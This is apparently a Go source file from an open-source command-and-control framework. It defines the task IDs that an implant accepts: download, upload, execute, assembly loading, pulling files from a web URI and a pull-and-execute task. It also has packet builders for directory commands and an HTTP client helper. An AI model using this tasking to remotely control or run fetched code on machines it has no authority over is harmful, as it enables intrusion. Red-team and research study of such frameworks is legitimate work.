package task

import (
	"context"
	"net"
	"net/http"
	"sync"
	"time"

	"github.com/iDigitalFlame/xmt/c2/task/wintask"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
	"github.com/iDigitalFlame/xmt/device/devtools"
)

const timeout = time.Second * 15

// The Mv* Packet ID values are built-in task values that are handled
// directory before the Mux, as these are critical for operations.
const (
	MvRefresh uint8 = 0x07
	MvTime    uint8 = 0x08
	MvPwd     uint8 = 0x09
	MvCwd     uint8 = 0x0A
	MvProxy   uint8 = 0x0B // TODO(dij): setup
	MvSpawn   uint8 = 0x0C // TODO(dij): setup
	MvMigrate uint8 = 0x0D // TODO(dij): setup?
	MvElevate uint8 = 0x0E // TODO(dij): setup?
	MvList    uint8 = 0x0F
)

// Built in Task Message ID Values
const (
	TvDownload uint8 = 0xC0
	TvUpload   uint8 = 0xC1
	TvExecute  uint8 = 0xC2
	TvAssembly uint8 = 0xC3

	// TvPull - pulls a file from a web URI
	// params URI, destination
	TvPull uint8 = 0xC7

	// TvPullExecute - pulls a file from a web URI and executes it.
	// uses similar rules to the Sentinel Downloader
	// params URI
	TvPullExecute uint8 = 0xC8
)

// Mappings is an fixed size array that contains the Tasker mappings for each
// ID value.
//
// Values that are less than 22 are ignored. Adding a mapping to here will
// allow it to be executed via the client Scheduler.
var Mappings = [0xFF]Tasker{
	TvDownload:    download,
	TvUpload:      upload,
	TvExecute:     execute,
	TvAssembly:    assembly,
	TvPull:        pull,
	TvPullExecute: pullExec,
}

var client struct {
	sync.Once
	v *http.Client
}

// Tasker is an function alias that will be tasked with executing a Job and
// will return an error or write the results to the supplied Writer.
// Associated data can be read from the supplied Reader.
//
// This function is NOT responsible with writing any error codes, the parent caller
// will handle that.
type Tasker func(context.Context, data.Reader, data.Writer) error

func init() {
	for i, t := range wintask.Tasks() {
		Mappings[wintask.Base+uint8(i)] = t
	}
}

// Pwd returns a print current directory Packet. This can be used to instruct
// the client to return a string value that contains the current working
// directory.
//
// C2 Details:
//  ID: MvPwd
//
//  Input:
//      NONE
//  Output:
//      - string (Pwd)
func Pwd() *com.Packet {
	return &com.Packet{ID: MvPwd}
}

// Ls returns a file list Packet. This can be used to instruct the client
// to return a string and bool list of the files in the directory specified.
//
// If 'd' is empty, the current working directory "." is used.
//
// The source path may contain environment variables that will be resolved during
// runtime.
//
// C2 Details:
//  ID: MvList
//
//  Input:
//      - string (Dir, can be empty)
//  Output:
//      - uint32 (Count)
//      - []struct{}
//        - string (Name)
//        - int32 (Mode)
//        - int64 (Size)
//        - int64 (Unix ModTIme)
func Ls(d string) *com.Packet {
	n := &com.Packet{ID: MvList}
	n.WriteString(d)
	return n
}

// Cwd returns a change directory Packet. This can be used to instruct the client
// to change from it's current working directory to the directory specified.
//
// Empty or invalid directory entires will return an error.
//
// The source path may contain environment variables that will be resolved during
// runtime.
//
// C2 Details:
//  ID: MvCwd
//
//  Input:
//      - string (Dir)
//  Output:
//      NONE
func Cwd(d string) *com.Packet {
	n := &com.Packet{ID: MvCwd}
	n.WriteString(d)
	return n
}
func request(r *http.Request) (*http.Response, error) {
	client.Do(func() {
		client.v = &http.Client{
			Transport: &http.Transport{
				Proxy:                 devtools.Proxy,
				DialContext:           (&net.Dialer{Timeout: timeout, KeepAlive: timeout, DualStack: true}).DialContext,
				MaxIdleConns:          64,
				IdleConnTimeout:       timeout,
				DisableKeepAlives:     true,
				ForceAttemptHTTP2:     false,
				TLSHandshakeTimeout:   timeout,
				ExpectContinueTimeout: timeout,
				ResponseHeaderTimeout: timeout,
			},
		}
	})
	return client.v.Do(r)
}
